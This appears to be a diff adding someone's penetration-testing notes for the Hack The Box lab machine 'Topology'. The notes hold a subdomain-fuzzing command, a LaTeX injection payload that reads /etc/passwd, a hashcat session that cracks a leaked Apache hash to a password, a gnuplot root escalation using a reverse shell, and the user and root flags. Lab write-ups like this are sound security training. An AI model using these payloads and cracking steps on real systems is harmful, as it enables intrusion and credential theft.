@@ -1,0 +1,156 @@
+=======================================================
+Attacking Machine IP:
+
+OS:				    Ubuntu
+Web-Technology:		Apache
+CMS:
+
+IP: 		http://10.10.11.217/
+FQDN:		topology.htb
+
+USERS:
+
+CREDENTIALS (ANY):
+
+vdaisley:calculus20
+
+FLAGs:
+-bash-5.0$ cat user.txt
+d420a5d8fef42c46f007267d7c062a75
+
+
+HINTS:
+
+=======================================================
+Take-Away Concepts:
+
+
+
+=======================================================
+Attack Vectors (To-Try List):
+
+80 http: → (fuzzing dir/files; robots, manual enum, check the source)
+
+
+
+https://infinitelogins.com/2020/09/02/bruteforcing-subdomains-wfuzz/
+sudo wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://topology.htb' -H "Host: FUZZ.topology.htb" --hw=545
+
+000000041:   200        5 L      9 W        108 Ch      "stats"
+000000237:   401        14 L     54 W       463 Ch      "dev"
+
+
+
+
+http://latex.topology.htb/equation.php
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
+
+
+\\\\ no idea where the LaTeX syntax for this came from ... tried multiple variants of payload all things and hacktricks 
+$\lstinputlisting{/etc/passwd}$
+
+
+//// able to cat out /etc/passwd and find vdaisley user
+
+///// looked around for .ssh but no joy.
+//// had to use walkthrough to find /var/www/dev/.htpasswd file
+
+
+vdaisley:$apr1$ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+
+$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+Hash.Target......: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+Time.Started.....: Wed Jun 21 11:08:46 2023, (19 secs)
+Time.Estimated...: Wed Jun 21 11:09:05 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    53390 H/s (8.89ms) @ Accel:256 Loops:250 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 997376/14344386 (6.95%)
+Rejected.........: 0/997376 (0.00%)
+Restore.Point....: 995328/14344386 (6.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
+Candidate.Engine.: Device Generator
+Candidates.#1....: carenambat -> cajun3
+Hardware.Mon.#1..: Util: 90%
+
+Started: Wed Jun 21 11:08:45 2023
+Stopped: Wed Jun 21 11:09:06 2023
+                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Documents/CTFs/HTB/topology]
+└─$ hashcat -m 1600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+=======================================================
+PRIV-ESC:
+
+pspy64
+
+https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/
+ //// write and execute access in /opt/gnuplot
+ 
+ ///// wrote rev shell and then copy into /gnuplot folder for root execute
+
+
+
+
+
+root@topology:~# cat root.txt
+cat root.txt
+840ce293e1687ad3199c753496aa2a2c
+
+
+=======================================================
+NMAP RESULTS:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
+|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
+|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Miskatonic University | Topology Group
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+=======================================================
+Web Services Enumeration:
+
+[ + NIKTO ]
+
+[ + WFUZZ ]
+
+FILES: / (Web Root)
+
+DIRECTORIES: / (Web Root)
+
+000000002:   200        17 L     68 W       1133 Ch     "images"
+000000536:   200        16 L     59 W       925 Ch      "css"
+
+=======================================================
+OTHER DATA:
+
+=======================================================
+WALKTHROUGH:
+https://hacktheboxwriteups.medium.com/htb-topology-writeup-2dee14592115
+
+
+
+=======================================================
+MISC
+
+
+
+=======================================================
+
+=======================================================
+
+
+vdaisley:$apr1$ONUB/S2$58eeNVirnRDB5zAIbIxTY0
